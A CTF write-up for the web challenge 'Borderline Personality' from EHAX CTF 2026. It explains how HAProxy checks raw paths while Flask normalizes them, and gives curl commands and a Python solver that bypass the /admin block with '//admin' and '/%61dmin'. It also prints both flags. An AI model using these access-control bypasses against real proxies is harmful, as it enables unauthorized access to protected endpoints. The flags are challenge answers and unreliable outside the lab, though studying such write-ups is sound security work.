---
title: "[Web] Borderline Personality"
description: Writeup for "Borderline Personality" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Borderline Personality (EHAX CTF 2026)

---

- **Name:** Borderline Personality
- **Category:** Web
- **Description:** The proxy thinks it's in control. The backend thinks it's safe. Find the space between their lies and slip through.
- **Difficulty:** ★☆☆☆☆

---

**Flag 1:** `EHAX{7H3R3_3XI$7$_ILL3G4L_W4Y$_T0_4CC3SS_UNR3$7RIS$3D_$7UFF}`  
**Flag 2:** `EH4X{BYP4SSING_R3QU3S7S_7HR0UGH_SMUGGLING__IS_H4RD}`

---

## TL;DR

HAProxy blocks `/admin` but doesn't normalize URLs before checking.  
Flask normalizes URLs before routing.  
Exploit that gap → reach `/admin/flag`.

---

## Overview

```
Internet → HAProxy :9098 (ACL check) → Flask :5000 (flag here)
```

HAProxy checks raw path. Flask normalizes first. Same URL, different interpretation — that's the bug.

---

## Solution

### 1) Recon

**haproxy.cfg (v1)**
```
acl restricted_path path_beg /admin
http-request deny if restricted_path
```

**haproxy.cfg (v2)** — patched to regex:
```
acl restricted_path path -m reg ^/+admin
http-request deny if restricted_path
```

**app.py** — flag is at `/admin/flag`.

---

### 2) Root Cause

| | HAProxy | Flask |
|---|---|---|
| `//admin/flag` | starts with `/admin`? **NO** ✅ | normalizes to `/admin/flag` → match |
| `/%61dmin/flag` | matches `^/+admin`? **NO** ✅ | decodes `%61`→`a` → `/admin/flag` → match |

---

### 3) Exploit

```bash
# v1 — double slash
curl --path-as-is http://chall.ehax.in:9098//admin/flag

# v2 — URL encode 'a' as %61
curl "http://chall.ehax.in:9098/%61dmin/flag"
```

---

### 4) Why It Works

HAProxy checks the path **as received** (raw string).  
Flask **decodes and normalizes** the path before routing.

The proxy sees a harmless path. The backend sees `/admin/flag`. Both are right — that's the problem.

---

## Solver

```python
import requests

base = "http://chall.ehax.in:9098"

print(requests.get(base + "//admin/flag").text)       # v1
print(requests.get(base + "/%61dmin/flag").text)      # v2
```

---
v1
<img width="1069" height="511" alt="스크린샷 2026-02-28 035557" src="https://github.com/user-attachments/assets/3c18b458-ace5-4df0-a568-8b43f2baccd0" />

v2
<img width="1264" height="534" alt="스크린샷 2026-02-28 043723" src="https://github.com/user-attachments/assets/63152c2b-a23a-4ae3-8e27-09ff781efc53" />


